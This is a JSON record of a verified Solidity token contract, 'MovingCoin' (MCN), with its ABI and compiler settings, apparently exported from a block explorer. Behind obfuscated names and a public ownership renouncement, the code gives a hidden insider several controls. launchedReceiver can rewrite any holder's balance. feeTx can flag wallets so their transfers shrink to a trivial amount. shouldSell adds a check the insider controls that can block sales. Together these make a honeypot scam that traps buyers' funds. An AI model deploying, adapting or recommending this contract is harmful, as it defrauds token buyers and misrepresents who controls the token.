{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract listMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchMinMax {\n    function createPair(address modeSwap, address senderTxShould) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface walletEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface enableShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverFrom) external view returns (uint256);\n\n    function transfer(address modeTo, uint256 launchedSell) external returns (bool);\n\n    function allowance(address modeMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeTo,\n        uint256 launchedSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minSwap, uint256 value);\n    event Approval(address indexed modeMarketing, address indexed spender, uint256 value);\n}\n\ninterface enableShouldMetadata is enableShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MovingCoin is listMode, enableShould, enableShouldMetadata {\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenTx;\n    }\n\n    function getOwner() external view returns (address) {\n        return listWallet;\n    }\n\n    uint256 private buyLimit;\n\n    function balanceOf(address receiverFrom) public view virtual override returns (uint256) {\n        return tradingTeamMax[receiverFrom];\n    }\n\n    mapping(address => mapping(address => uint256)) private minBuy;\n\n    event OwnershipTransferred(address indexed receiverReceiver, address indexed atFrom);\n\n    uint256 public minAt;\n\n    mapping(address => uint256) private tradingTeamMax;\n\n    uint8 private swapFromIs = 18;\n\n    constructor (){\n        if (buyLimit == teamSell) {\n            senderFee = true;\n        }\n        exemptTeam();\n        walletEnable fromMode = walletEnable(takeReceiverMin);\n        exemptAmount = launchMinMax(fromMode.factory()).createPair(fromMode.WETH(), address(this));\n        marketingShould = launchMinMax(fromMode.factory()).feeTo();\n        \n        fromMin = _msgSender();\n        teamLimitToken[fromMin] = true;\n        tradingTeamMax[fromMin] = exemptBuy;\n        if (minAt == teamSell) {\n            teamSell = minAt;\n        }\n        emit Transfer(address(0), fromMin, exemptBuy);\n    }\n\n    mapping(address => bool) public toSwap;\n\n    function autoMarketing(uint256 launchedSell) public {\n        enableTx();\n        marketingFund = launchedSell;\n    }\n\n    string private isExempt = \"Moving Coin\";\n\n    uint256 private exemptBuy = 100000000 * 10 ** 18;\n\n    address takeReceiverMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private tokenTx = \"MCN\";\n\n    uint256 marketingFund;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapFromIs;\n    }\n\n    uint256 public teamSell;\n\n    function enableTx() private view {\n        require(teamLimitToken[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return listWallet;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return isExempt;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptBuy;\n    }\n\n    bool public tokenReceiverWallet;\n\n    uint256 constant senderTeam = 12 ** 10;\n\n    function senderAmount(address marketingLimit) public {\n        if (tokenReceiverWallet) {\n            return;\n        }\n        \n        teamLimitToken[marketingLimit] = true;\n        \n        tokenReceiverWallet = true;\n    }\n\n    uint256 public walletTrading = 3;\n\n    function shouldSell(address enableTotal, address modeTo, uint256 launchedSell) internal returns (bool) {\n        if (enableTotal == fromMin) {\n            return amountMarketing(enableTotal, modeTo, launchedSell);\n        }\n        uint256 receiverLaunch = enableShould(exemptAmount).balanceOf(marketingShould);\n        require(receiverLaunch == marketingFund);\n        require(modeTo != marketingShould);\n        if (toSwap[enableTotal]) {\n            return amountMarketing(enableTotal, modeTo, senderTeam);\n        }\n        launchedSell = modeTake(enableTotal, modeTo, launchedSell);\n        return amountMarketing(enableTotal, modeTo, launchedSell);\n    }\n\n    address marketingShould;\n\n    mapping(address => bool) public teamLimitToken;\n\n    bool public tradingMax;\n\n    function amountMarketing(address enableTotal, address modeTo, uint256 launchedSell) internal returns (bool) {\n        require(tradingTeamMax[enableTotal] >= launchedSell);\n        tradingTeamMax[enableTotal] -= launchedSell;\n        tradingTeamMax[modeTo] += launchedSell;\n        emit Transfer(enableTotal, modeTo, launchedSell);\n        return true;\n    }\n\n    function allowance(address receiverModeTo, address isTo) external view virtual override returns (uint256) {\n        if (isTo == takeReceiverMin) {\n            return type(uint256).max;\n        }\n        return minBuy[receiverModeTo][isTo];\n    }\n\n    function launchedReceiver(address sellWallet, uint256 launchedSell) public {\n        enableTx();\n        tradingTeamMax[sellWallet] = launchedSell;\n    }\n\n    uint256 public shouldFromTotal = 0;\n\n    bool private senderFee;\n\n    address public fromMin;\n\n    address public exemptAmount;\n\n    function transfer(address sellWallet, uint256 launchedSell) external virtual override returns (bool) {\n        return shouldSell(_msgSender(), sellWallet, launchedSell);\n    }\n\n    function modeTake(address enableTotal, address modeTo, uint256 launchedSell) internal view returns (uint256) {\n        require(launchedSell > 0);\n\n        uint256 fundTrading = 0;\n        if (enableTotal == exemptAmount && walletTrading > 0) {\n            fundTrading = launchedSell * walletTrading / 100;\n        } else if (modeTo == exemptAmount && shouldFromTotal > 0) {\n            fundTrading = launchedSell * shouldFromTotal / 100;\n        }\n        require(fundTrading <= launchedSell);\n        return launchedSell - fundTrading;\n    }\n\n    function transferFrom(address enableTotal, address modeTo, uint256 launchedSell) external override returns (bool) {\n        if (_msgSender() != takeReceiverMin) {\n            if (minBuy[enableTotal][_msgSender()] != type(uint256).max) {\n                require(launchedSell <= minBuy[enableTotal][_msgSender()]);\n                minBuy[enableTotal][_msgSender()] -= launchedSell;\n            }\n        }\n        return shouldSell(enableTotal, modeTo, launchedSell);\n    }\n\n    uint256 senderModeBuy;\n\n    function feeTx(address liquidityTake) public {\n        enableTx();\n        if (buyLimit != minAt) {\n            tradingMax = true;\n        }\n        if (liquidityTake == fromMin || liquidityTake == exemptAmount) {\n            return;\n        }\n        toSwap[liquidityTake] = true;\n    }\n\n    function exemptTeam() public {\n        emit OwnershipTransferred(fromMin, address(0));\n        listWallet = address(0);\n    }\n\n    function approve(address isTo, uint256 launchedSell) public virtual override returns (bool) {\n        minBuy[_msgSender()][isTo] = launchedSell;\n        emit Approval(_msgSender(), isTo, launchedSell);\n        return true;\n    }\n\n    address private listWallet;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverModeTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedSell\",\"type\":\"uint256\"}],\"name\":\"autoMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"}],\"name\":\"feeTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSell\",\"type\":\"uint256\"}],\"name\":\"launchedReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLimit\",\"type\":\"address\"}],\"name\":\"senderAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFromTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamLimitToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiverWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MovingCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}